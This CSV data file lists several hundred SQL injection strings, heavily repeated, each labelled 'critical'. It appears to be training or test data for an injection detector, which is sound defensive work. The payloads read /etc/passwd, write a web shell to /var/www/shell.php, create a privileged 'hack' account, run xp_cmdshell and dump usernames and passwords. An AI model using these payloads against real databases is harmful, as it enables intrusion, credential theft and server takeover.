query,risk
' INTO OUTFILE '/tmp/test',critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
"' UNION ALL SELECT username, password FROM users --",critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
'; SELECT load_file('/etc/passwd') --,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; EXEC xp_cmdshell('dir'),critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; SELECT table_name FROM information_schema.tables -- OR xp_cmdshell,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; SELECT * FROM mysql.user -- OR xp_cmdshell,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; SELECT load_file('/etc/passwd') --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; SELECT * FROM mysql.user -- OR xp_cmdshell,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; SELECT load_file('/etc/passwd') --,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; SELECT load_file('/etc/passwd') --,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
"' UNION ALL SELECT username, password FROM users --",critical
'; EXEC(@cmd) -- AND load_file('test'),critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
"' UNION ALL SELECT username, password FROM users --",critical
"'; UNION SELECT username, password FROM users --",critical
'; SELECT table_name FROM information_schema.tables -- OR xp_cmdshell,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; SELECT table_name FROM information_schema.tables -- OR xp_cmdshell,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
'; SELECT load_file('/etc/passwd') --,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
'; SELECT table_name FROM information_schema.tables -- OR xp_cmdshell,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
' INTO OUTFILE '/tmp/test',critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
' INTO OUTFILE '/tmp/test',critical
'; SELECT * FROM mysql.user -- AND load_file('test'),critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; SELECT load_file('/etc/passwd') --,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; EXEC(@cmd) -- AND load_file('test'),critical
' INTO OUTFILE '/tmp/test',critical
' INTO OUTFILE '/tmp/test',critical
"' UNION ALL SELECT username, password FROM users --",critical
"' UNION ALL SELECT username, password FROM users --",critical
'; SELECT table_name FROM information_schema.tables -- OR xp_cmdshell,critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
' INTO OUTFILE '/tmp/test',critical
'; EXEC xp_cmdshell('dir'),critical
'; EXEC(@cmd) -- AND load_file('test'),critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; SELECT load_file('/etc/passwd') --,critical
'; SELECT table_name FROM information_schema.tables -- OR xp_cmdshell,critical
"' UNION ALL SELECT username, password FROM users --",critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; EXEC xp_cmdshell('dir'),critical
'; SELECT * FROM mysql.user -- OR xp_cmdshell,critical
'; EXEC xp_cmdshell('dir'),critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
"' UNION ALL SELECT username, password FROM users --",critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; EXEC(@cmd) -- AND load_file('test'),critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
"'; UNION SELECT username, password FROM users --",critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
'; SELECT * FROM mysql.user -- AND load_file('test'),critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; SELECT * FROM mysql.user -- OR xp_cmdshell,critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
'; SELECT * FROM mysql.user -- AND load_file('test'),critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; SELECT * FROM mysql.user -- OR xp_cmdshell,critical
'; SELECT table_name FROM information_schema.tables -- OR xp_cmdshell,critical
'; SELECT load_file('/etc/passwd') --,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
"' UNION ALL SELECT username, password FROM users --",critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
"'; UNION SELECT username, password FROM users --",critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
"' UNION ALL SELECT username, password FROM users --",critical
'; SELECT * FROM mysql.user -- OR xp_cmdshell,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; SELECT load_file('/etc/passwd') --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
"' UNION ALL SELECT username, password FROM users --",critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; SELECT table_name FROM information_schema.tables -- OR xp_cmdshell,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; SELECT table_name FROM information_schema.tables -- OR xp_cmdshell,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; SELECT load_file('/etc/passwd') --,critical
'; SELECT table_name FROM information_schema.tables -- OR xp_cmdshell,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; SELECT load_file('/etc/passwd') --,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; SELECT load_file('/etc/passwd') --,critical
'; SELECT load_file('/etc/passwd') --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
"'; UNION SELECT username, password FROM users --",critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; SELECT load_file('/etc/passwd') --,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; SELECT table_name FROM information_schema.tables -- OR xp_cmdshell,critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
'; EXEC xp_cmdshell('dir'),critical
"' UNION ALL SELECT username, password FROM users --",critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
"'; UNION SELECT username, password FROM users --",critical
'; EXEC(@cmd) -- AND load_file('test'),critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; SELECT load_file('/etc/passwd') --,critical
'; EXEC(@cmd) -- AND load_file('test'),critical
' INTO OUTFILE '/var/www/shell.php' --,critical
"'; UNION SELECT username, password FROM users --",critical
"'; UNION SELECT username, password FROM users --",critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
' INTO OUTFILE '/var/www/shell.php' --,critical
' INTO OUTFILE '/tmp/test',critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; SELECT * FROM mysql.user -- AND load_file('test'),critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
"'; UNION SELECT username, password FROM users --",critical
'; SELECT * FROM mysql.user -- OR xp_cmdshell,critical
'; SELECT * FROM mysql.user -- AND load_file('test'),critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
' INTO OUTFILE '/tmp/test',critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; SELECT * FROM mysql.user -- AND load_file('test'),critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; SELECT load_file('/etc/passwd') --,critical
'; SELECT load_file('/etc/passwd') --,critical
'; SELECT * FROM mysql.user -- AND load_file('test'),critical
"'; UNION SELECT username, password FROM users --",critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
'; SELECT load_file('/etc/passwd') --,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
'; SELECT load_file('/etc/passwd') --,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
"'; UNION SELECT username, password FROM users --",critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; SELECT * FROM mysql.user -- AND load_file('test'),critical
'; SELECT load_file('/etc/passwd') --,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; EXEC xp_cmdshell('dir'),critical
"' UNION ALL SELECT username, password FROM users --",critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
"'; UNION SELECT username, password FROM users --",critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
"' UNION ALL SELECT username, password FROM users --",critical
"' UNION ALL SELECT username, password FROM users --",critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; SELECT load_file('/etc/passwd') --,critical
'; SELECT load_file('/etc/passwd') --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; EXEC xp_cmdshell('dir'),critical
'; SELECT * FROM mysql.user -- AND load_file('test'),critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
"' UNION ALL SELECT username, password FROM users --",critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
"' UNION ALL SELECT username, password FROM users --",critical
'; SELECT * FROM mysql.user -- OR xp_cmdshell,critical
"'; UNION SELECT username, password FROM users --",critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; EXEC xp_cmdshell('dir'),critical
'; EXEC xp_cmdshell('dir'),critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
"'; UNION SELECT username, password FROM users --",critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
"' UNION ALL SELECT username, password FROM users --",critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; SELECT * FROM mysql.user -- AND load_file('test'),critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; SELECT * FROM mysql.user -- OR xp_cmdshell,critical
"'; UNION SELECT username, password FROM users --",critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
' INTO OUTFILE '/tmp/test',critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
"' UNION ALL SELECT username, password FROM users --",critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; SELECT table_name FROM information_schema.tables -- OR xp_cmdshell,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; SELECT load_file('/etc/passwd') --,critical
"' UNION ALL SELECT username, password FROM users --",critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
' INTO OUTFILE '/var/www/shell.php' --,critical
"' UNION ALL SELECT username, password FROM users --",critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; SELECT table_name FROM information_schema.tables -- OR xp_cmdshell,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; SELECT * FROM mysql.user -- OR xp_cmdshell,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; EXEC xp_cmdshell('dir'),critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; SELECT load_file('/etc/passwd') --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; EXEC xp_cmdshell('dir'),critical
'; SELECT load_file('/etc/passwd') --,critical
'; SELECT * FROM mysql.user -- AND load_file('test'),critical
"' UNION ALL SELECT username, password FROM users --",critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; SELECT load_file('/etc/passwd') --,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
' INTO OUTFILE '/var/www/shell.php' --,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; SELECT load_file('/etc/passwd') --,critical
'; SELECT table_name FROM information_schema.tables -- OR xp_cmdshell,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
"'; UNION SELECT username, password FROM users --",critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
"'; UNION SELECT username, password FROM users --",critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; SELECT * FROM mysql.user -- OR xp_cmdshell,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
'; SELECT load_file('/etc/passwd') --,critical
"' UNION ALL SELECT username, password FROM users --",critical
'; EXEC(@cmd) -- AND load_file('test'),critical
'; EXEC(@cmd) -- AND load_file('test'),critical
"' UNION ALL SELECT username, password FROM users --",critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
'; SELECT table_name FROM information_schema.tables -- OR xp_cmdshell,critical
'; SELECT load_file('/etc/passwd') --,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
' INTO OUTFILE '/tmp/test',critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
"' UNION ALL SELECT username, password FROM users --",critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
'; SELECT load_file('/etc/passwd') --,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; SELECT * FROM mysql.user -- AND load_file('test'),critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; EXEC(@cmd) -- AND load_file('test'),critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
' INTO OUTFILE '/tmp/test',critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
"' UNION ALL SELECT username, password FROM users --",critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
"'; UNION SELECT username, password FROM users --",critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; SELECT * FROM mysql.user -- AND load_file('test'),critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; EXEC xp_cmdshell('dir'),critical
'; SELECT table_name FROM information_schema.tables -- OR xp_cmdshell,critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; EXEC xp_cmdshell('dir'),critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
"' UNION ALL SELECT username, password FROM users --",critical
"'; UNION SELECT username, password FROM users --",critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; SELECT load_file('/etc/passwd') --,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; SELECT load_file('/etc/passwd') --,critical
' INTO OUTFILE '/tmp/test',critical
'; SELECT load_file('/etc/passwd') --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
"' UNION ALL SELECT username, password FROM users --",critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; SELECT load_file('/etc/passwd') --,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; SELECT load_file('/etc/passwd') --,critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
'; SELECT load_file('/etc/passwd') --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; SELECT load_file('/etc/passwd') --,critical
"'; UNION SELECT username, password FROM users --",critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; SELECT load_file('/etc/passwd') --,critical
'; SELECT load_file('/etc/passwd') --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
"' UNION ALL SELECT username, password FROM users --",critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
"'; UNION SELECT username, password FROM users --",critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
"'; UNION SELECT username, password FROM users --",critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
'; SELECT * FROM mysql.user -- AND load_file('test'),critical
"'; UNION SELECT username, password FROM users --",critical
'; SELECT COUNT(*) FROM information_schema.tables -- OR xp_cmdshell,critical
'; EXEC(@cmd) -- AND load_file('test'),critical
'; SELECT * FROM mysql.user -- OR xp_cmdshell,critical
'; CREATE TRIGGER evil BEFORE INSERT ON users --,critical
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --,critical
'; GRANT ALL PRIVILEGES ON *.* TO 'hack' --,critical
"' UNION ALL SELECT username, password FROM users --",critical
"' UNION ALL SELECT username, password FROM users --",critical
'; SELECT * FROM mysql.user -- OR xp_cmdshell,critical
"' UNION ALL SELECT username, password FROM users --",critical
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
'; SELECT load_file('/etc/passwd') --,critical
"' UNION ALL SELECT username, password FROM users --",critical
'; SELECT COUNT(*) FROM information_schema.tables -- AND load_file('test'),critical
"' UNION ALL SELECT username, password FROM users --",critical
